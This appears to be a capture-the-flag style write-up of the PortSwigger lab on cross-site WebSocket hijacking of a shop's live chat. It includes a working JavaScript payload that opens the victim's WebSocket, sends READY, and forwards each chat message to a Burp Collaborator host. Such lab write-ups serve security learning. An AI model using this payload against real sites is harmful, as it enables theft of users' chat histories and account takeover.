
# Cross-site WebSocket hijacking

This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.

---------------------------------------------

Reference: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking

---------------------------------------------

The request to /chat does not contain a CSRF token:



![img](images/Cross-site%20WebSocket%20hijacking/1.png)


Before sending anything, the message “READY” is sent and the server responds:





![img](images/Cross-site%20WebSocket%20hijacking/2.png)
![img](images/Cross-site%20WebSocket%20hijacking/3.png)


Then it is possible to send messages:





![img](images/Cross-site%20WebSocket%20hijacking/4.png)
![img](images/Cross-site%20WebSocket%20hijacking/5.png)



Payload:

```
<script>
    var ws = new WebSocket('wss://0ab10034038a49a581f67501001e002b.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://v95x1aaxyvlt8fptdelcbw94ovumie63.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```






![img](images/Cross-site%20WebSocket%20hijacking/6.png)
![img](images/Cross-site%20WebSocket%20hijacking/7.png)
